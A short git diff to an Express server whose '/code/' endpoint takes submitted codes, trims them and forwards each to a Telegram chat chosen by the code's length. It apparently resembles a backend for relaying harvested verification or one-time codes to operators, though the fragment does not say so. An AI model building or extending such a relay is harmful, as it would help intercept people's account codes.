@@ -12,8 +12,7 @@ const payloadFilePath = path.join(__dirname, "payloads.json")
 app.use(express.json());
 
 app.post('/code/', (req, res) => {
-    const code = req.body.code;
-    console.log(code.length)
+    const code = req.body.code.trim();
     const chatId = getSenderByCodeLength(code.length)
     bot.telegram.sendMessage(chatId, `Code: <code>${code.toString()}</code>`, {parse_mode: "HTML"}).catch(err => console.log(err))
     res.sendStatus(200);
